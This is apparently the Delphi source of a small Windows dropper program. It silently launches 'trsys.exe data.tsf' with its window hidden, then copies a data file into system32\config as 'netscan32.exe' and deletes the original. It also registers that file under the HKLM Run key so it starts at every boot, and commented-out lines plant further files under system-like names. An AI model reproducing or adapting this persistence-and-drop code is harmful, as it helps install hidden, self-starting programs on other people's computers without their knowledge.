program imp;

uses
  Windows, Registry, Classes, SysUtils;

var
  Reg: TRegistry;
  Res: Integer;
  PWindir: PChar;
  Curdir, Windir: string;
  f: Text;

function MoveFile1(InFile,OutFile: String;
  From,Count: Longint): Longint;
var
  InFS,OutFS: TFileStream;
begin
  InFS:=TFileStream.Create(InFile,fmOpenRead);
  OutFS:=TFileStream.Create(OutFile,fmCreate);
  InFS.Seek(From,soFromBeginning);
  Result:=OutFS.CopyFrom(InFS,Count);
  InFS.Free;
  OutFS.Free;
  AssignFile(f,Curdir+'\data.dsf');
  Erase(f)
end;

{function CopyFile(InFile,OutFile: String;
  From,Count: Longint): Longint;
var
  InFS,OutFS: TFileStream;
begin
  InFS:=TFileStream.Create(InFile,fmOpenRead);
  OutFS:=TFileStream.Create(OutFile,fmCreate);
  InFS.Seek(From,soFromBeginning);
  Result:=OutFS.CopyFrom(InFS,Count);
  InFS.Free;
  OutFS.Free
end;}

begin
  Reg:=TRegistry.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',false);
  Reg.WriteString('netscan32','netscan32.exe');
  Reg.CloseKey;
  WinExec('trsys.exe data.tsf',0);
  Sleep(7000);
  PWindir:=StrAlloc(MAX_PATH);
  Res:=GetWindowsDirectory(PWindir,MAX_PATH);
  Windir:=StrPas(PWindir);
  GetDir(0,CurDir);
  MoveFile1(CurDir+'\data.dsf',windir+'\system32\config\netscan32.exe',0,0);
{  CopyFile(curdir+'\netwin32.for',windir+'\netscan32.exe',0,0);
  CopyFile(curdir+'\trsys.exe',windir+'\ts.exe',0,0);
  CopyFile(curdir+'\data.tsf',windir+'\netd32.tsf',0,0);}
  Reg.Free
end.
